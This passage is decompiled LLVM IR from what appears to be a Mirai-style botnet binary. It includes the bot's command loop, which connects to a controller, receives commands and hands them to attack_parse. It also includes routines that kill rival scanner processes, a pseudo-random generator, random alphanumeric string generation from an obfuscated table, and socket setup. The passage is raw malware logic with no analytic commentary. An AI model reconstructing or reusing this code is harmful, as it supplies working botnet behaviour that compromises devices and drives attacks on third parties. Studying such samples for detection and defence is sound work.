  %v2_c89c = load i32, i32* @global_var_20da0.89, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_20f1c.92 to i8*), align 4
  %v4_c8ac = call i32 @__libc_connect(i32 %v2_c89c, i32 ptrtoint (i16** @global_var_23a30.70 to i32), i32 16)
  br label %dec_label_pc_c62c

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c6b4
  %v2_c8b8 = load i32, i32* @global_var_20da0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_c8c8 = call i32 @__libc_send(i32 %v2_c8b8, i32 %v2_c8bc, i32 2, i32 16384)
  br label %dec_label_pc_c6e8

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c72c
  store i32 4, i32* @r4, align 4
  store i32 %v2_c8d8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_c8b4, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_c8f4 = call i32 @getsockopt(i32 %v2_c7ac, i32 1, i32 4, i32 %v2_c8d8, i32 %v2_c8b4)
  %v3_c8f8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_c8f8, i32* %r3.global-to-local, align 4
  %v2_c8fc = icmp eq i32 %v3_c8f8, 0
  br i1 %v2_c8fc, label %dec_label_pc_c984, label %dec_label_pc_c904

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8d0
  %v2_c904 = load i32, i32* @global_var_20da0.89, align 4
  %v1_c908 = call i32 @__GI___libc_close(i32 %v2_c904)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_c910 = load i32, i32* @r5, align 4
  %v2_c910 = inttoptr i32 %v1_c910 to i32*
  store i32 -1, i32* %v2_c910, align 4
  %v0_c914 = call i32 @rand_next()
  %v3_c91c = zext i32 %v0_c914 to i64
  %v4_c91c = mul nuw i64 %v3_c91c, 3435973837
  %v7_c91c = trunc i64 %v4_c91c to i32
  store i32 %v7_c91c, i32* %ip.global-to-local, align 4
  %v3_c9202 = udiv i64 %v4_c91c, 34359738368
  %v3_c9244 = mul nuw nsw i64 %v3_c9202, 8
  %v3_c924 = trunc i64 %v3_c9244 to i32
  store i32 %v3_c924, i32* %r2.global-to-local, align 4
  %v2_c9286 = mul nuw nsw i64 %v3_c9202, 2
  %v2_c928 = trunc i64 %v2_c9286 to i32
  %v2_c92c = add i32 %v3_c924, %v2_c928
  store i32 %v2_c92c, i32* %r3.global-to-local, align 4
  %v2_c930 = sub i32 %v0_c914, %v2_c92c
  %v1_c934 = add i32 %v2_c930, 1
  %v1_c938 = call i32 @sleep(i32 %v1_c934)
  br label %dec_label_pc_c5ac

dec_label_pc_c940:                                ; preds = %dec_label_pc_c6f8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_c8d8, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_c954 = call i32 @__libc_accept(i32 %v2_c6ec, i32 %v2_c94c, i32 %v2_c8d8, i32 16, i32 16)
  %v1_c958 = call i32 @scanner_kill(i32 %v5_c954)
  %v2_c968 = call i32 @kill(i32 %v1_c964, i32 9)
  store i32 ptrtoint (i32* @global_var_20f18.80 to i32), i32* %r3.global-to-local, align 4
  %v2_c970 = load i32, i32* @global_var_20f18.80, align 4
  %v2_c974 = icmp eq i32 %v2_c970, 0
  br i1 %v2_c974, label %dec_label_pc_c97c, label %dec_label_pc_ca1c

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c940, %dec_label_pc_ca1c
  %v1_c980 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c8d0, %dec_label_pc_c97c
  %v2_c988 = call i32 @util_strlen(i8* %v1_c988)
  %sext = mul i32 %v2_c988, 16777216
  %v1_c98c = sdiv i32 %sext, 16777216
  %v7_c98c = inttoptr i32 %v1_c98c to i8*
  store i8* %v7_c98c, i8** %stack_var_-42, align 4
  %v0_c990 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* @lr, align 4
  %v0_c998 = load i32, i32* @r4, align 4
  store i32 %v0_c998, i32* %r2.global-to-local, align 4
  store i32 %v0_c990, i32* @global_var_23a2c.55, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c9a8 = load i32, i32* @r5, align 4
  %v1_c9a8 = inttoptr i32 %v0_c9a8 to i32*
  %v2_c9a8 = load i32, i32* %v1_c9a8, align 4
  %v4_c9ac = call i32 @__libc_send(i32 %v2_c9a8, i32 ptrtoint (i32* @global_var_180f8.99 to i32), i32 %v0_c998, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_c9b8 = load i32, i32* @r5, align 4
  %v1_c9b8 = inttoptr i32 %v0_c9b8 to i32*
  %v2_c9b8 = load i32, i32* %v1_c9b8, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_c9c4 = call i32 @__libc_send(i32 %v2_c9b8, i32 %v2_c8bc, i32 1, i32 16384)
  %v3_c9c8 = load i8*, i8** %stack_var_-42, align 4
  %v4_c9c8 = ptrtoint i8* %v3_c9c8 to i32
  store i32 %v4_c9c8, i32* %r2.global-to-local, align 4
  %v3_c9cc = icmp eq i8* %v3_c9c8, null
  br i1 %v3_c9cc, label %dec_label_pc_c5ac, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c984
  %v0_c9d4 = load i32, i32* @r5, align 4
  %v1_c9d4 = inttoptr i32 %v0_c9d4 to i32*
  %v2_c9d4 = load i32, i32* %v1_c9d4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_c9e0 = call i32 @__libc_send(i32 %v2_c9d4, i32 %v2_c3f0, i32 %v4_c9c8, i32 16384)
  br label %dec_label_pc_c5ac

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_c7e0
  %v0_c9e8 = load i32, i32* @r5, align 4
  %v1_c9e8 = inttoptr i32 %v0_c9e8 to i32*
  %v2_c9e8 = load i32, i32* %v1_c9e8, align 4
  store i32 %v2_c9e8, i32* %r3.global-to-local, align 4
  %v7_c9ec = icmp eq i32 %v2_c9e8, 4
  br i1 %v7_c9ec, label %dec_label_pc_c5ac, label %bb44

bb44:                                             ; preds = %dec_label_pc_c9e8
  %v8_c9f0 = icmp eq i32 %v2_c9e8, 11
  br i1 %v8_c9f0, label %dec_label_pc_c5ac, label %dec_label_pc_c9f8

dec_label_pc_c9f8:                                ; preds = %dec_label_pc_ca7c, %bb44, %dec_label_pc_c814
  %v2_c9f8 = load i32, i32* @global_var_20da0.89, align 4
  store i32 51716, i32* @lr, align 4
  %v1_ca00 = icmp ne i32 %v2_c9f8, -1
  call void @__pseudo_cond_branch(i1 %v1_ca00, i32 ptrtoint (i32* @global_var_12d80.94 to i32))
  store i32 ptrtoint (i32* @global_var_20da0.89 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_20da0.89, align 4
  %v1_ca14 = call i32 @sleep(i32 1)
  br label %dec_label_pc_c5ac

dec_label_pc_ca1c:                                ; preds = %dec_label_pc_c940
  %v2_ca20 = call i32 @kill(i32 %v2_c970, i32 9)
  br label %dec_label_pc_c97c

dec_label_pc_ca28:                                ; preds = %dec_label_pc_c81c
  %v3_ca28 = udiv i32 %v4_c820, 256
  %v1_ca2c = urem i32 %v4_c820, 256
  store i32 %v1_ca2c, i32* %r3.global-to-local, align 4
  %v4_ca30 = mul nuw nsw i32 %v1_ca2c, 256
  %v5_ca30 = or i32 %v4_ca30, %v3_ca28
  %v6_ca30 = trunc i32 %v5_ca30 to i16
  store i32 %v5_ca30, i32* %r2.global-to-local, align 4
  store i32 %v2_c6d8, i32* @lr, align 4
  %v7_ca3c = inttoptr i32 %v5_ca30 to i8*
  store i8* %v7_ca3c, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_ca30, 1025
  br i1 %tmp45, label %dec_label_pc_ca58, label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca28
  %v2_ca44 = load i32, i32* @global_var_20da0.89, align 4
  %v1_ca48 = call i32 @__GI___libc_close(i32 %v2_ca44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ca50 = load i32, i32* @r8, align 4
  %v2_ca50 = inttoptr i32 %v1_ca50 to i32*
  store i32 -1, i32* %v2_ca50, align 4
  br label %dec_label_pc_c5ac

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca28
  %v0_ca58 = load i32, i32* @r4, align 4
  %v1_ca58 = load i32, i32* @r5, align 4
  %v2_ca58 = inttoptr i32 %v1_ca58 to i32*
  store i32 %v0_ca58, i32* %v2_ca58, align 4
  store i32 %v2_ca60, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_ca68 = load i32, i32* @global_var_20da0.89, align 4
  %v7_ca70 = call i32 @__libc_recv(i32 %v2_ca68, i32 %v2_ca60, i32 %v5_ca30, i32 16386)
  %v7_ca74 = icmp eq i32 %v7_ca70, -1
  br i1 %v7_ca74, label %dec_label_pc_c9e8, label %dec_label_pc_ca7c

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca58
  %v2_ca7c = icmp eq i32 %v7_ca70, 0
  br i1 %v2_ca7c, label %dec_label_pc_c9f8, label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca7c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_ca90 = load i32, i32* @global_var_20da0.89, align 4
  %v4_ca94 = call i32 @__libc_recv(i32 %v2_ca90, i32 %v2_c8bc, i32 2, i32 16384)
  %v3_ca9c = load i8*, i8** %stack_var_-42, align 4
  %v4_ca9c = ptrtoint i8* %v3_ca9c to i32
  %v3_caa0 = udiv i32 %v4_ca9c, 256
  %v1_caa4 = mul i32 %v4_ca9c, 256
  %v4_caa8 = and i32 %v1_caa4, 65280
  %v5_caa8 = or i32 %v4_caa8, %v3_caa0
  store i32 %v5_caa8, i32* %ip.global-to-local, align 4
  store i32 %v2_c6d8, i32* @lr, align 4
  store i32 %v5_caa8, i32* %r2.global-to-local, align 4
  %v2_cab8 = load i32, i32* @global_var_20da0.89, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_cac0 = inttoptr i32 %v5_caa8 to i8*
  store i8* %v6_cac0, i8** %stack_var_-42, align 4
  %v6_cac4 = call i32 @__libc_recv(i32 %v2_cab8, i32 %v2_ca60, i32 %v5_caa8, i32 16384)
  store i32 %v2_c6d8, i32* %r2.global-to-local, align 4
  %v3_cacc = load i8*, i8** %stack_var_-42, align 4
  %v3_cad0 = icmp eq i8* %v3_cacc, null
  br i1 %v3_cad0, label %dec_label_pc_c5ac, label %dec_label_pc_cad8

dec_label_pc_cad8:                                ; preds = %dec_label_pc_ca84
  %v4_cacc = ptrtoint i8* %v3_cacc to i32
  %v5_cadc = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_cacc, i32 %v2_c6d8)
  br label %dec_label_pc_c5ac

; uselistorder directives
  uselistorder i8* %v3_cacc, { 1, 0 }
  uselistorder i32 %v5_caa8, { 1, 0, 2, 3 }
  uselistorder i32 %v7_ca70, { 1, 0 }
  uselistorder i32 %v5_ca30, { 1, 0, 3, 2 }
  uselistorder i32 %v3_c850, { 3, 2, 1, 0 }
  uselistorder i32 %v4_c820, { 1, 0, 2, 3 }
  uselistorder i32 %v4_c808, { 1, 0 }
  uselistorder i32 %v2_c7ac, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_c6ec, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c6d4, { 1, 0, 2 }
  uselistorder i32 %v5_c6a0, { 1, 2, 0 }
  uselistorder i32 %v2_c5ec, { 2, 1, 0 }
  uselistorder i32 %v1_c5dc, { 1, 2, 0 }
  uselistorder i32 %v1_c5c0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_c8d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c8bc, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_c8b4, { 1, 0 }
  uselistorder i32 %v2_c6d8, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_c5a8, { 1, 0, 2 }
  uselistorder i32 %v2_c454, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_c440, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_c3b0, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_20f18.80, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_20f1c.92 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20f1c.92 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_20d9c.75, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_20da0.89, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_20da4.68, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_c0c4.66 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_c984, { 1, 0 }
  uselistorder label %dec_label_pc_c97c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_c6e8, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_c62c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c61c, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_c414, { 2, 0, 1 }
}

define i32 @function_cb08(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cb08:
  %v0_cb08 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_cb08, i32 -22317636)
  %v0_cb10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_cb10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_cb08
  %v1_cb14 = load i32, i32* @r8, align 4
  store i32 %v1_cb14, i32* %arg1, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cb08, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_cb24 = load i32, i32* @global_var_20f20.101, align 4
  %v2_cb28 = load i32, i32* @global_var_20f2c.103, align 4
  %v4_cb34 = mul i32 %v2_cb24, 2048
  %v5_cb34 = xor i32 %v4_cb34, %v2_cb24
  %v4_cb38 = udiv i32 %v2_cb28, 524288
  %v5_cb38 = xor i32 %v4_cb38, %v2_cb28
  %v2_cb3c = load i32, i32* @global_var_20f24.105, align 4
  %v2_cb40 = load i32, i32* @global_var_20f28.107, align 4
  %v2_cb44 = xor i32 %v5_cb38, %v5_cb34
  %v4_cb48 = udiv i32 %v5_cb34, 256
  %v5_cb48 = xor i32 %v2_cb44, %v4_cb48
  store i32 %v2_cb3c, i32* @global_var_20f20.101, align 4
  store i32 %v2_cb40, i32* @global_var_20f24.105, align 4
  store i32 %v2_cb28, i32* @global_var_20f28.107, align 4
  store i32 %v5_cb48, i32* @global_var_20f2c.103, align 4
  ret i32 %v5_cb48

; uselistorder directives
  uselistorder i32 %v2_cb28, { 2, 1, 0 }
  uselistorder i32 %v2_cb24, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cb80 = call i32 @__GI_time(i32* null)
  store i32 %v2_cb80, i32* @global_var_20f20.101, align 4
  %v1_cb8c = call i32 @__getpid(i32 %v2_cb80)
  store i32 %v1_cb8c, i32* @r0, align 4
  %v0_cb94 = call i32 @getppid()
  %v2_cb9c = xor i32 %v1_cb8c, %v0_cb94
  store i32 %v2_cb9c, i32* @global_var_20f24.105, align 4
  %v1_cba4 = call i32 @clock(i32 %v2_cb9c)
  %v2_cba8 = load i32, i32* @global_var_20f24.105, align 4
  %v2_cbb4 = xor i32 %v2_cba8, %v1_cba4
  store i32 %v2_cbb4, i32* @global_var_20f2c.103, align 4
  store i32 %v1_cba4, i32* @global_var_20f28.107, align 4
  ret i32 %v1_cba4

; uselistorder directives
  uselistorder i32 %v1_cba4, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_cbdc = load i32, i32* @r4, align 4
  %v6_cbdc = load i32, i32* @r5, align 4
  %v9_cbdc = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_cbf0 = call i32 @table_unlock_val(i32 19)
  %v3_cbfc = call i32 @table_retrieve_val(i32 19, i32* null)
  store i32 %v3_cbfc, i32* @r1, align 4
  %v2_cc08 = bitcast i32* %stack_var_-72 to i8*
  %v3_cc08 = call i32 @strcpy(i8* %v2_cc08, i32 %v3_cbfc)
  %v2_cc0c = icmp eq i32 %arg2, 0
  br i1 %v2_cc0c, label %dec_label_pc_cc88, label %dec_label_pc_cc14

dec_label_pc_cc14:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_20f20.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f24.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f28.107 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f2c.103 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_cc6c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge, %dec_label_pc_cc14
  %v1_cc4c = phi i32 [ %v1_cc4c.pre, %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge ], [ ptrtoint (i32* @global_var_20f20.101 to i32), %dec_label_pc_cc14 ]
  %v2_cc28 = load i32, i32* @global_var_20f2c.103, align 4
  store i32 %v2_cc28, i32* %r2.global-to-local, align 4
  %v2_cc2c = load i32, i32* @global_var_20f20.101, align 4
  %v4_cc30 = udiv i32 %v2_cc28, 524288
  %v5_cc30 = xor i32 %v4_cc30, %v2_cc28
  %v4_cc34 = mul i32 %v2_cc2c, 2048
  %v5_cc34 = xor i32 %v4_cc34, %v2_cc2c
  %v2_cc38 = xor i32 %v5_cc30, %v5_cc34
  %v2_cc3c = load i32, i32* @global_var_20f24.105, align 4
  %v2_cc40 = load i32, i32* @global_var_20f28.107, align 4
  store i32 %v2_cc40, i32* %ip.global-to-local, align 4
  %v4_cc44 = udiv i32 %v5_cc34, 256
  %v5_cc44 = xor i32 %v2_cc38, %v4_cc44
  store i32 %v5_cc44, i32* @r4, align 4
  %v2_cc4c = inttoptr i32 %v1_cc4c to i32*
  store i32 %v2_cc3c, i32* %v2_cc4c, align 4
  %v0_cc50 = load i32, i32* %ip.global-to-local, align 4
  %v1_cc50 = load i32, i32* %r8.global-to-local, align 4
  %v2_cc50 = inttoptr i32 %v1_cc50 to i32*
  store i32 %v0_cc50, i32* %v2_cc50, align 4
  %v0_cc54 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc54 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc54 = inttoptr i32 %v1_cc54 to i32*
  store i32 %v0_cc54, i32* %v2_cc54, align 4
  %v0_cc58 = load i32, i32* @r4, align 4
  %v1_cc58 = load i32, i32* @r6, align 4
  %v2_cc58 = inttoptr i32 %v1_cc58 to i32*
  store i32 %v0_cc58, i32* %v2_cc58, align 4
  %v2_cc5c = call i32 @util_strlen(i8* %v2_cc08)
  %v0_cc64 = load i32, i32* @r4, align 4
  %v3_cc68 = urem i32 %v0_cc64, %v2_cc5c
  %v2_cc70 = add i32 %v3_cc68, %v2_cc6c
  %v1_cc74 = add i32 %v2_cc70, -32
  %v2_cc74 = inttoptr i32 %v1_cc74 to i8*
  %v3_cc74 = load i8, i8* %v2_cc74, align 1
  %v2_cc78 = load i32, i32* @r5, align 4
  %v3_cc78 = load i32, i32* %fp.global-to-local, align 4
  %v4_cc78 = add i32 %v3_cc78, %v2_cc78
  %v5_cc78 = inttoptr i32 %v4_cc78 to i8*
  store i8 %v3_cc74, i8* %v5_cc78, align 1
  %v0_cc7c = load i32, i32* @r5, align 4
  %v1_cc7c = add i32 %v0_cc7c, 1
  store i32 %v1_cc7c, i32* @r5, align 4
  %v1_cc80 = load i32, i32* %sb.global-to-local, align 4
  %v9_cc80 = icmp eq i32 %v1_cc7c, %v1_cc80
  br i1 %v9_cc80, label %dec_label_pc_cc88, label %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge

dec_label_pc_cc28.dec_label_pc_cc28_crit_edge:    ; preds = %dec_label_pc_cc28
  %v1_cc4c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cc28

dec_label_pc_cc88:                                ; preds = %dec_label_pc_cc28, %entry
  %v1_cc8c = call i32 @table_lock_val(i32 19)
  store i32 %v3_cbdc, i32* @r4, align 4
  store i32 %v6_cbdc, i32* @r5, align 4
  store i32 %v9_cbdc, i32* @r6, align 4
  ret i32 %v1_cc8c

; uselistorder directives
  uselistorder i32 %v2_cc2c, { 1, 0 }
  uselistorder i32 %v2_cc28, { 1, 0, 2 }
  uselistorder i32* @global_var_20f2c.103, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_20f28.107, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_20f24.105, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_20f20.101, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ccb8 = load i32, i32* @global_var_23a48.117, align 4
  %v2_ccc0 = call i32 @kill(i32 %v2_ccb8, i32 9)
  ret i32 %v2_ccc0

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ccd4 = load i32, i32* @r4, align 4
  store i32 %v3_ccd4, i32* %stack_var_-16, align 4
  %v6_ccd4 = load i32, i32* @r5, align 4
  %v9_ccd4 = load i32, i32* @r6, align 4
  %v12_ccd4 = load i32, i32* @lr, align 4
  %v0_ccd8 = load i32, i32* @r0, align 4
  store i32 %v0_ccd8, i32* @r5, align 4
  %v1_ccdc = add i32 %v0_ccd8, 4
  %v2_ccdc = inttoptr i32 %v1_ccdc to i32*
  %v3_ccdc = load i32, i32* %v2_ccdc, align 4
  store i32 %v3_ccdc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 52480, i32* @lr, align 4
  %v1_ccfc = icmp ne i32 %v3_ccdc, -1
  call void @__pseudo_cond_branch(i1 %v1_ccfc, i32 ptrtoint (i32* @global_var_12d80.94 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r6, align 4
  store i32 %v0_cd08, i32* %r2.global-to-local, align 4
  %v3_cd0c = call i32 @socket(i32 2, i32 1, i32 %v0_cd08)
  store i32 %v3_cd0c, i32* %r0.global-to-local, align 4
  %v7_cd10 = icmp eq i32 %v3_cd0c, -1
  %v1_cd14 = load i32, i32* @r5, align 4
  %v2_cd14 = add i32 %v1_cd14, 4
  %v3_cd14 = inttoptr i32 %v2_cd14 to i32*
  store i32 %v3_cd0c, i32* %v3_cd14, align 4
  br i1 %v7_cd10, label %entry.dec_label_pc_cd8c_crit_edge, label %dec_label_pc_cd1c

entry.dec_label_pc_cd8c_crit_edge:                ; preds = %entry
  %v1_cd94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd8c

dec_label_pc_cd1c:                                ; preds = %entry
  %v2_cce0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_cd1c = load i32, i32* @r5, align 4
  %v1_cd1c = add i32 %v0_cd1c, 28
  store i32 %v1_cd1c, i32* %r0.global-to-local, align 4
  %v0_cd20 = load i32, i32* @r6, align 4
  %v2_cd20 = add i32 %v0_cd1c, 24
  %v3_cd20 = inttoptr i32 %v2_cd20 to i32*
  store i32 %v0_cd20, i32* %v3_cd20, align 4
  %v2_cd28 = call i32 @util_zero(i32 %v1_cd1c, i32 256)
  store i32 %v2_cd28, i32* %r0.global-to-local, align 4
  %v0_cd2c = load i32, i32* @r5, align 4
  %v1_cd2c = add i32 %v0_cd2c, 4
  %v2_cd2c = inttoptr i32 %v1_cd2c to i32*
  %v3_cd2c = load i32, i32* %v2_cd2c, align 4
  store i32 %v3_cd2c, i32* @r4, align 4
  %v0_cd30 = load i32, i32* @r6, align 4
  store i32 %v0_cd30, i32* @r2, align 4
  store i32 %v3_cd2c, i32* %r0.global-to-local, align 4
  %v2_cd3c = call i32 @__libc_fcntl(i32 %v3_cd2c, i32 3)
  %v1_cd44 = or i32 %v2_cd3c, 2048
  store i32 %v1_cd44, i32* @r2, align 4
  %v0_cd48 = load i32, i32* @r4, align 4
  store i32 %v0_cd48, i32* %r0.global-to-local, align 4
  %v2_cd4c = call i32 @__libc_fcntl(i32 %v0_cd48, i32 4)
  store i32 %v2_cd4c, i32* %r0.global-to-local, align 4
  %v2_cd54 = load i32, i32* @global_var_20f64.119, align 4
  store i32 %v2_cd54, i32* %r2.global-to-local, align 4
  %v1_cd5c = load i32, i32* @r5, align 4
  %v2_cd5c = add i32 %v1_cd5c, 12
  %v3_cd5c = inttoptr i32 %v2_cd5c to i32*
  store i32 1, i32* %v3_cd5c, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_cd68 = load i32, i32* %r2.global-to-local, align 4
  %v1_cd68 = load i32, i32* @r5, align 4
  %v2_cd68 = add i32 %v1_cd68, 8
  %v3_cd68 = inttoptr i32 %v2_cd68 to i32*
  store i32 %v0_cd68, i32* %v3_cd68, align 4
  %v0_cd6c = load i32, i32* @r5, align 4
  %v1_cd70 = add i32 %v0_cd6c, 4
  %v2_cd70 = inttoptr i32 %v1_cd70 to i32*
  %v3_cd70 = load i32, i32* %v2_cd70, align 4
  store i32 %v3_cd70, i32* %r0.global-to-local, align 4
  %v1_cd74 = add i32 %v0_cd6c, 20
  %v2_cd74 = inttoptr i32 %v1_cd74 to i16*
  %v3_cd74 = load i16, i16* %v2_cd74, align 2
  %v4_cd74 = zext i16 %v3_cd74 to i32
  store i32 %v4_cd74, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cd88 = call i32 @__libc_connect(i32 %v3_cd70, i32 %v2_cce0, i32 16)
  store i32 %v3_cd88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd8c

dec_label_pc_cd8c:                                ; preds = %entry.dec_label_pc_cd8c_crit_edge, %dec_label_pc_cd1c
  %v1_cd94 = phi i32 [ %v1_cd94.pre, %entry.dec_label_pc_cd8c_crit_edge ], [ %v3_cd88, %dec_label_pc_cd1c ]
  %v2_cd90 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_cd90, i32* @r4, align 4
  store i32 %v6_ccd4, i32* @r5, align 4
  store i32 %v9_ccd4, i32* @r6, align 4
  store i32 %v12_ccd4, i32* @lr, align 4
  ret i32 %v1_cd94

; uselistorder directives
  uselistorder i32 %v3_cd0c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
